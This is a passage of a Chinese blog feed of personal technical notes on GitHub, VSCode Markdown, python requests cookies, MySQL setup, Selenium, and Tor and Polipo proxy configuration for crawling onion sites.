href="https://www.jianshu.com/p/8c4ff8eca14f">https://www.jianshu.com/p/8c4ff8eca14f</a></p><p><a href="https://www.cnblogs.com/wuhuacong/p/7284420.html">https://www.cnblogs.com/wuhuacong/p/7284420.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> bootstrap-table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在github怎么建立一个新的文件夹</title>
      <link href="2020/04/19/2020-04-19-how_to_create_new_folder_on_github/"/>
      <url>2020/04/19/2020-04-19-how_to_create_new_folder_on_github/</url>
      
        <content type="html"><![CDATA[<h2 id="在github怎么建立一个新的文件夹"><a href="#在github怎么建立一个新的文件夹" class="headerlink" title="在github怎么建立一个新的文件夹"></a>在github怎么建立一个新的文件夹</h2><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/github%E4%BF%AE%E6%94%B9path.png" alt="github修改path"></p><ul><li>键入文件夹名称，然后键入’/‘以进入子文件夹。</li><li>键入“..”，然后键入“/”可向上跳转一级目录。</li><li>使用退格键可编辑父目录的名称。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VsCode编写Markdown文档</title>
      <link href="2020/04/18/2020-04-18-VsCode_write_markdown/"/>
      <url>2020/04/18/2020-04-18-VsCode_write_markdown/</url>
      
        <content type="html"><![CDATA[<h2 id="VsCode编写Markdown文档"><a href="#VsCode编写Markdown文档" class="headerlink" title="VsCode编写Markdown文档"></a>VsCode编写Markdown文档</h2><h3 id="下载安装VsCode"><a href="#下载安装VsCode" class="headerlink" title="下载安装VsCode"></a>下载安装VsCode</h3><p>在<a href="https://code.visualstudio.com/">vscode官网</a>下载安装包，安装即可。</p><p>安装vscode PicGo插件，修改配置，直接使用快捷键在vscode中插入图片图床链接。<br><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vscode_markdown1.PNG"></p><p>其中快捷键有PicGo支持两种方式在vscode上粘贴图片：</p><ul><li><code>ctrl+alt+u</code>：上传剪贴板中的图片到服务器。</li><li><code>ctrl+alt+e</code>：打开文件浏览器选择图片上传。</li></ul><h3 id="使用插件Markdown-Preview-Enhanced"><a href="#使用插件Markdown-Preview-Enhanced" class="headerlink" title="使用插件Markdown Preview Enhanced"></a>使用插件Markdown Preview Enhanced</h3><p>Markdown Preview Enhanced是一个很好用的完善预览功能的插件，可以更加形象的展示所编写的pdf格式的文档样式。在插件库中搜索markdown即可找到该插件，然后点击安装后重新加载。你会发现工作区的右上角多了一个预览按钮，这个按钮就是Markdown Preview Enhanced插件产生的，尝试点击之后看到更加接近pdf文件格式的预览效果。你会发现<strong>工作区的右上角多了一个预览按钮</strong>，这个按钮就是Markdown Preview Enhanced插件产生的，尝试点击之后看到更加接近pdf文件格式的预览效果。同样可以<strong>直接在编辑界面右键</strong>即可开启Markdown Preview Enhanced插件的预览功能。还可以通过快捷键打开，<strong>先按（Ctrl+k）然后紧接着按（v）</strong>即可。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python requests response获取不到cookie问题</title>
      <link href="2020/04/18/2020-04-18-python_requests_response_cannot_get_cookie_issue/"/>
      <url>2020/04/18/2020-04-18-python_requests_response_cannot_get_cookie_issue/</url>
      
        <content type="html"><![CDATA[<h2 id="python-requests-response获取不到cookie问题"><a href="#python-requests-response获取不到cookie问题" class="headerlink" title="python requests response获取不到cookie问题"></a>python requests response获取不到cookie问题</h2><p>在python用用户名+密码请求登陆接口时,  预期能拿到cookie(获得cookie后设置response到用户浏览器cookie里),  但发现请求登陆接口的response里并没有cookie</p><p>排查过程:</p><ol><li><p>利用BP可以拿到</p></li><li><p>对比BP和python requests, 返回status code不一样, BP返回301 python requests返回200</p></li></ol><p>所以是python requests自动重定向了, 且重定向后的返回没有cookie</p><p>解决:</p><p>requests.post添加参数 allow_redirects=False 禁止自动重定向</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response &#x3D; requests.post(&quot;http:&#x2F;&#x2F;***&quot;, data&#x3D;params, headers&#x3D;headers, allow_redirects&#x3D;False)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASCII码表</title>
      <link href="2020/04/18/2020-04-18-ASCII/"/>
      <url>2020/04/18/2020-04-18-ASCII/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/e850352ac65c103880a07b53bc119313b17e8941.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASCII </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 只能sudo连接的问题</title>
      <link href="2020/04/17/2020-04-17-mysql_only_sudo_error/"/>
      <url>2020/04/17/2020-04-17-mysql_only_sudo_error/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql-只能sudo连接的问题"><a href="#Mysql-只能sudo连接的问题" class="headerlink" title="Mysql 只能sudo连接的问题"></a>Mysql 只能sudo连接的问题</h2><p>mysql在ubuntu上安装后，系统非root用户执行登录操作，出现如下情况：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424005302.png" alt="image-20200424005300841"></p><p>一开始以为是用户没有权限，后来经过百度发现是mysql使用了auth_socket plugin进行认证。</p><p>解决方法是使用mysql自带密码认证功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush privilege；</span><br></pre></td></tr></table></figure><p>保存后重启mysql，可以正常登陆了，不再需要sudo。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux selenium安装配置及使用</title>
      <link href="2020/04/17/2020-04-17-linux_selenium_install_config_use/"/>
      <url>2020/04/17/2020-04-17-linux_selenium_install_config_use/</url>
      
        <content type="html"><![CDATA[<h2 id="linux-selenium安装配置及使用"><a href="#linux-selenium安装配置及使用" class="headerlink" title="linux selenium安装配置及使用"></a>linux selenium安装配置及使用</h2><h3 id="安装selenium"><a href="#安装selenium" class="headerlink" title="安装selenium"></a>安装selenium</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><h3 id="浏览器驱动安装"><a href="#浏览器驱动安装" class="headerlink" title="浏览器驱动安装"></a>浏览器驱动安装</h3><p>驱动下载地址 <a href="https://github.com/mozilla/geckodriver/releases/tag/v0.23.0">https://github.com/mozilla/geckodriver/releases/tag/v0.23.0</a></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="symbol">https:</span>/<span class="regexp">/github.com/mozilla</span><span class="regexp">/geckodriver/releases</span><span class="regexp">/download/v</span>0.<span class="number">23.0</span>/geckodriver-v0.<span class="number">23.0</span>-linux64.tar.gz</span><br><span class="line">tar -xvzf geckodriver-v0.<span class="number">23.0</span>-linux64.tar.gz</span><br><span class="line">chmod +x geckodriver</span><br><span class="line">sudo mv geckodriver /usr/local/bin/</span><br></pre></td></tr></table></figure><p>PS：/usr/local/bin/目录是给用户放置自己的可执行程序的地方，在系统任何地方都可以直接执行，推荐放在这里，不会被系统升级而覆盖同名文件，而/usr/bin下面的都是系统预装的可执行程序，会随着系统升级而改变。注意usr 指 Unix System Resource。其次，可通过echo $PATH查看PATH，PATH这个目录下放的可执行程序，在系统任何地方都可以直接执行，不需要指定路径。</p><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from selenium <span class="keyword">import</span> webdriver</span><br><span class="line">from selenium.webdriver.firefox.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"># options = Options()</span><br><span class="line"># options.add_argument(<span class="string">&#x27;-headless&#x27;</span>) # 无头参数</span><br><span class="line"># browser = webdriver.Firefox(firefox_options=options)</span><br><span class="line">    </span><br><span class="line">browser = webdriver.Firefox()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">browser.find_element_by_id(<span class="string">&#x27;kw&#x27;</span>).send_keys(<span class="string">&#x27;selenium&#x27;</span>)</span><br><span class="line">browser.find_element_by_id(<span class="string">&#x27;su&#x27;</span>).click()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(browser.current_url)</span><br><span class="line"></span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure><h3 id="也可以指定目录，例如指定在当前路径下"><a href="#也可以指定目录，例如指定在当前路径下" class="headerlink" title="也可以指定目录，例如指定在当前路径下"></a>也可以指定目录，例如指定在当前路径下</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browser = webdriver.Firefox(executable_path=<span class="string">&#x27;./geckodriver&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04 安装MySQL</title>
      <link href="2020/04/17/2020-04-17-ubuntu_install_mysql/"/>
      <url>2020/04/17/2020-04-17-ubuntu_install_mysql/</url>
      
        <content type="html"><![CDATA[<h4 id="Ubuntu18-04-安装MySQL"><a href="#Ubuntu18-04-安装MySQL" class="headerlink" title="Ubuntu18.04 安装MySQL"></a>Ubuntu18.04 安装MySQL</h4><h3 id="1-安装MySQL"><a href="#1-安装MySQL" class="headerlink" title="1.安装MySQL"></a>1.安装MySQL</h3><p>在Ubuntu中，默认情况下，只有最新版本的MySQL包含在APT软件包存储库中,要安装它，只需更新服务器上的包索引并安装默认包apt-get。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install mysql-server</span><br></pre></td></tr></table></figure><h4 id="2-配置MySQL"><a href="#2-配置MySQL" class="headerlink" title="2.配置MySQL"></a>2.配置MySQL</h4><h5 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure><p>配置项较多，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#1</span><br><span class="line">VALIDATE PASSWORD PLUGIN can be used to test passwords...</span><br><span class="line">Press y|Y for Yes, any other key for No: N (我的选项)</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">Please set the password for root here...</span><br><span class="line">New password: (输入密码)</span><br><span class="line">Re-enter new password: (重复输入)</span><br><span class="line"></span><br><span class="line">#3</span><br><span class="line">By default, a MySQL installation has an anonymous user,</span><br><span class="line">allowing anyone to log into MySQL without having to have</span><br><span class="line">a user account created for them...</span><br><span class="line">Remove anonymous users? (Press y|Y for Yes, any other key for No) : N (我的选项)</span><br><span class="line"></span><br><span class="line">#4</span><br><span class="line">Normally, root should only be allowed to connect from</span><br><span class="line">&#39;localhost&#39;. This ensures that someone cannot guess at</span><br><span class="line">the root password from the network...</span><br><span class="line">Disallow root login remotely? (Press y|Y for Yes, any other key for No) : Y (我的选项)</span><br><span class="line"></span><br><span class="line">#5</span><br><span class="line">By default, MySQL comes with a database named &#39;test&#39; that</span><br><span class="line">anyone can access...</span><br><span class="line">Remove test database and access to it? (Press y|Y for Yes, any other key for No) : N (我的选项)</span><br><span class="line"></span><br><span class="line">#6</span><br><span class="line">Reloading the privilege tables will ensure that all changes</span><br><span class="line">made so far will take effect immediately.</span><br><span class="line">Reload privilege tables now? (Press y|Y for Yes, any other key for No) : Y (我的选项)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="检查mysql服务状态"><a href="#检查mysql服务状态" class="headerlink" title="检查mysql服务状态"></a>检查mysql服务状态</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status mysql.service</span><br></pre></td></tr></table></figure><h4 id="3-配置远程访问"><a href="#3-配置远程访问" class="headerlink" title="3.配置远程访问"></a>3.配置远程访问</h4><p>在Ubuntu下MySQL缺省是只允许本地访问的，如果你要其他机器也能够访问的话，需要进行配置；</p><h5 id="用根用户进入"><a href="#用根用户进入" class="headerlink" title="用根用户进入"></a>用根用户进入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -uroot -p</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO root@localhost IDENTIFIED BY &quot;密码&quot;</span><br></pre></td></tr></table></figure><p>其中root@localhost,localhost就是本地访问，配置成<code>%</code>就是所有主机都可连接。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu下Mysql可视化工具MySQL-workbench</title>
      <link href="2020/04/17/2020-04-17-ubuntu_mysql_visualization_tool_MySQL-workbench/"/>
      <url>2020/04/17/2020-04-17-ubuntu_mysql_visualization_tool_MySQL-workbench/</url>
      
        <content type="html"><![CDATA[<h2 id="ubuntu下Mysql可视化工具MySQL-workbench及简单操作"><a href="#ubuntu下Mysql可视化工具MySQL-workbench及简单操作" class="headerlink" title="ubuntu下Mysql可视化工具MySQL-workbench及简单操作"></a>ubuntu下Mysql可视化工具MySQL-workbench及简单操作</h2><p>安装MySQL-workbench</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-workbench</span><br></pre></td></tr></table></figure><p>如果安装成功，可以在应用程序中找到</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424005938.png" alt="img"></p><p>MySQL-workbench首页如下图</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424005951.png" alt="img"></p><p>点击新建连接的按钮，符号是“+”的按钮，出现下图，在“Connection name”输入连接名称。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010015.png" alt="img"></p><p>点击“OK”即可，出现下图：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010024.png" alt="img"></p><p>点击“jgirl”连接，出现下图，输入密码后，即可进入MySQL-workbench编辑页面。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010031.png" alt="img"></p><p>MySQL-workbench编辑页面如图，上面是菜单栏，左下角是数据库列表显示，中间是sql语句编写区域：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010041.png" alt="img"></p><p>在sql语句编辑区编辑语句，选中需要执行的代码后，点击上方图标<img src="assets/20150919154320317.png" alt="img">即可执行，效果如下图：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424010049.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tor详解</title>
      <link href="2020/04/16/2020-04-16-Tor_detailed_introduction/"/>
      <url>2020/04/16/2020-04-16-Tor_detailed_introduction/</url>
      
        <content type="html"><![CDATA[<h1 id="Tor详解"><a href="#Tor详解" class="headerlink" title="Tor详解"></a>Tor详解</h1><h3 id="Tor原理"><a href="#Tor原理" class="headerlink" title="Tor原理"></a>Tor原理</h3><p>Tor是一个三重代理（也就是说Tor每发出一个请求会先经过Tor网络的3个节点），其网络中有两种主要服务器角色：</p><ul><li>中继服务器：负责中转数据包的路由器，可以理解为代理；</li><li>目录服务器：保存Tor网络中所有中继服务器列表相关信息（保存中继服务器地址、公钥）。</li></ul><p>Tor客户端先与目录服务器通信获得全球活跃中继节点信息，然后再随机选择三个节点组成circuit （电路），用户流量跳跃这三个节点（hop）之后最终到达目标网站服务器。如下图示：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004925.jpg" alt="img"></p><p>Tor客户端与目标服务器的通信分为两个部分：建立通信链路和在通信链路上发送数据包</p><p><strong>一、建立通信链路的过程：</strong></p><ol><li>客户端与目录服务器建立链接，并从目录服务器中选取一个时延最低的服务器作为第一个中继服务器/OR1；</li><li>客户端向OR1发送一个请求建链请求，OR1验证完客户端的合法性后生成一对密钥（公钥pubkey_OR1_Client、私钥prikey_OR1_Client）,然后将公钥pubkey_OR1_Client发回给客户端（至此，客户端成功的建立了其与OR1的通信链路）；</li><li>客户端又从目录服务器中选择一个时延最低的中继服务器OR2，并向OR1发送一个数据包：使用pubkey_OR1_Client加密OR2的地址；</li><li>OR1收到数据包后使用prikey_OR1_Client解开数据包，发现是一个让其自身与另外一个服务器OR2建立链接的请求，那么OR1重复步骤2与OR2建立链接，并将OR2返回的OR1与OR2链路的公钥pubkey_OR1_OR2返回给客户端；</li><li>客户端重复步骤3、4，建立OR2与OR3之间的通信链路，并接收到OR2与OR3之间链路的公钥pubkey_OR2_OR3；</li><li>至此，客户端与3个中继服务器之间的链路/circuit已经成功建立，客户端拥有3把公钥：pubkey_Client_OR1、pubkey_OR1_OR2、pubkey_OR2_OR3。</li></ol><p><strong>二、发送数据包：</strong></p><ol><li>客户端将要发送的数据（data）经过3层加密包裹：<em>第一层：使用pubkey_OR2_OR3加密data：pubkey_OR2_OR3(data)；</em>第二层：使用pubkey_OR1_OR2加密第一层加密后的数据：pubkey_OR1_OR2(pubkey_OR2_OR3(data))；第三层：使用pubkey_Client_OR1加密第二层机密后的数据：pubkey_Client_OR1(pubkey_OR1_OR2(pubkey_OR2_OR3(data)))；</li><li>OR1收到客户端发来的数据后使用其与Client链路的私钥prikey_Client_OR1解开数据包，发现数据包是发往OR2的，那么OR1就将解开后的数据包发送给OR2；</li><li>OR2收到OR1发来的数据包重复OR1的步骤：将接收的数据包解开发往OR3；</li><li>OR3收到数据包后，使用prikey_OR2_OR3解开数据包，这个时候的数据包是客户端要发往目的服务器的真实数据包data。此时，OR3就将data路由给目标服务器。</li></ol><p>数据包是层层包裹，每经过一个中继服务器就解开一层，它的结构就跟洋葱相同，你只能看出它的外表，而想要看到核心，就必须把它层层的剥开（这就它叫洋葱/Onion路由的缘由）。Tor匿名的原理也正是基于此：真实数据包在层层包裹之后在链路上发送，Tor链路上的节点不知道数据包的源头，而只知道它要送往的下一个地址，这样就无法追踪到发送者IP地址。</p><h3 id="windows下搭建暗网环境"><a href="#windows下搭建暗网环境" class="headerlink" title="windows下搭建暗网环境"></a>windows下搭建暗网环境</h3><p>一开始对于Tor我们使用的是windows下Tor V2版本，采用的登陆方式是</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004926.png" alt="image-20200415194044137"></p><p>tor的本质也是一种socks5代理。所以爬取暗网信息的一个流程就是： python爬虫或其他应用，使用本地http8118端口代理，privoxy等socks转http工具将本地http8118端口数据转发到socks5 9050端口,vidalia将9050端口的数据转发到本地1080端口，1080端口将数据转发到远程vps。</p><p>1.Tor使用shadowsocks/ssh隧道的1080端口（翻墙）<br>2.我们使用vidalia控制Tor的连接，使用Tor的9050端口（如果你使用的是TorBrowser的话，对外监听端口为9150）<br>3.利用privoxy或cow等socks转http工具，提供爬虫代码环境，爬取内容。</p><p>后来升级到HSv3，只要更换vidalia启动的支持v3版本的Tor.exe即可。</p><p>后来V2转成V3，主要表现为如下几点</p><blockquote><p>1.签名算法从SHA1/DH/RSA1024升级到SHA3/ed25519/curve25519；</p><p>2.改进的Tor directory protocol，安全性更高；</p><p>3.更好的洋葱地址，换成sha3，可以提高枚举生成一样地址的难度；</p><p>4.可拓展的交换协议。</p></blockquote><h3 id="ubuntu配置tor环境"><a href="#ubuntu配置tor环境" class="headerlink" title="ubuntu配置tor环境"></a>ubuntu配置tor环境</h3><p>1.在tor官网下载最新版tor源码，我下载使用的是tor-0.4.2.7.tar.gz</p><p><a href="https://www.torproject.org/download/download.html">https://www.torproject.org/download/download.html</a></p><p>2.编译tor源码</p><p>需要安装一些包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libevent-dev libssl-dev zlib1g-dev</span><br><span class="line"></span><br><span class="line">.&#x2F;configure</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>3.编译完成后，在tor配置文件/etc/tor/torrc中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RunAsDaemon 1</span><br><span class="line">Socks5Proxy 127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>开启守护进程，并使用socks5代理 127.0.0.1:1080</p><p>4.在shell中输入命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start tor</span><br><span class="line">或</span><br><span class="line">tor -f &#x2F;etc&#x2F;tor&#x2F;torrc</span><br></pre></td></tr></table></figure><p>启动tor服务，tor默认开启9050端口转发数据。</p><p>【注：曾在docker中编译tor，发现编译完成后没有tor命令，需要使用命令 cd /usr/local/bin进入可执行文件夹，输入./tor运行Tor，配置文件在/usr/local/etc/tor/torrc】</p><p>5.ssh连接vps并开在1080端口开设隧道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -D 1080 user@ip</span><br></pre></td></tr></table></figure><p>6.将firefox网络设置代理socks5:127.0.01:9050</p><p>7.修改以下firefox设置，即可在firefox浏览器中访问洋葱地址</p><p>打开firefox,在地百址栏输入<a href="https://www.baidu.com/s?wd=about:config&tn=SE_PcZhidaonwhc_ngpagmjz&rsv_dl=gh_pc_zhidao">about:config</a>，打开Firefox的设置页面</p><p>在过滤器中输入browser.fixup.alternate.prefix，把www.删除</p><p>在过滤器中输入network.dns.blockDotOnion,更改为false</p><p>在过滤器中输入network.proxy.socks_remote_dns,更改为true</p><p>在过滤器中输入javascript.enabled,更改为false</p><p>8.若希望其他应用也可以访问Tor，比如爬虫。那么需要利用polipo将socks转为http</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install polipo</span><br><span class="line">polipo socksParentProxy&#x3D;localhost:9050</span><br></pre></td></tr></table></figure><p>Polipo将自动在127.0.0.1:8123端口将socks代理转换为http代理。</p><p>在爬虫中添加http:127.0.0.1:8123代理即可对onion进行抓取。</p><p>更改配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Ubuntu: &#x2F;etc&#x2F;polipo&#x2F;config</span><br><span class="line"></span><br><span class="line"># This file only needs to list configuration variables that deviate </span><br><span class="line"># from the default values. See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;polipo&#x2F;examples&#x2F;config.sample </span><br><span class="line"># and &quot;polipo -v&quot; for variables you can tweak and further information. </span><br><span class="line">logSyslog &#x3D; true </span><br><span class="line">logFile &#x3D; &#x2F;var&#x2F;log&#x2F;polipo&#x2F;polipo.log </span><br><span class="line">proxyAddress &#x3D; &quot;0.0.0.0&quot; </span><br><span class="line">socksParentProxy &#x3D; &quot;127.0.0.1:9050&quot; </span><br><span class="line">socksProxyType &#x3D; socks5 </span><br><span class="line">proxyPort &#x3D; 8118</span><br><span class="line">#chunkHighMark &#x3D; 50331648 </span><br><span class="line">#objectHighMark &#x3D; 16384 </span><br><span class="line">#serverMaxSlots &#x3D; 64 </span><br><span class="line">#serverSlots &#x3D; 16 </span><br><span class="line">#serverSlots1 &#x3D; 32 </span><br></pre></td></tr></table></figure><p>使用配置文件启动Polipo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">polipo -c &#x2F;etc&#x2F;polipo&#x2F;config</span><br><span class="line">或</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;polipo restart </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polipo全局代理设置方法</title>
      <link href="2020/04/16/2020-04-16-polipo_global_proxy_setting/"/>
      <url>2020/04/16/2020-04-16-polipo_global_proxy_setting/</url>
      
        <content type="html"><![CDATA[<h2 id="Polipo全局代理设置方法"><a href="#Polipo全局代理设置方法" class="headerlink" title="Polipo全局代理设置方法"></a>Polipo全局代理设置方法</h2><p>利用vps ssh或者shadowsocks科学上网，使用的都是socks5协议，而终端很多工具目前只支持http和https等协议,对socks5协议支持不够好,常用方法就是将socks协议转换成http协议。通过polipo进行二次转发。</p><p>安装polipo </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install polipo </span><br></pre></td></tr></table></figure><p> 编辑配置文件     </p><p>配置文件位置 /etc/polipo/config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># This file only needs to list configuration variables that deviate </span><br><span class="line"># from the default values. See &#x2F;usr&#x2F;share&#x2F;doc&#x2F;polipo&#x2F;examples&#x2F;config.sample </span><br><span class="line"># and &quot;polipo -v&quot; for variables you can tweak and further information. </span><br><span class="line">logSyslog &#x3D; true </span><br><span class="line">logFile &#x3D; &#x2F;var&#x2F;log&#x2F;polipo&#x2F;polipo.log </span><br><span class="line">proxyAddress &#x3D; &quot;0.0.0.0&quot; </span><br><span class="line">socksParentProxy &#x3D; &quot;127.0.0.1:1080&quot; </span><br><span class="line">socksProxyType &#x3D; socks5 </span><br><span class="line">proxyPort &#x3D; 8123 </span><br><span class="line">chunkHighMark &#x3D; 50331648 </span><br><span class="line">objectHighMark &#x3D; 16384 </span><br><span class="line">serverMaxSlots &#x3D; 64 </span><br><span class="line">serverSlots &#x3D; 16 </span><br><span class="line">serverSlots1 &#x3D; 32 </span><br></pre></td></tr></table></figure><p> 3 重启polipo服务 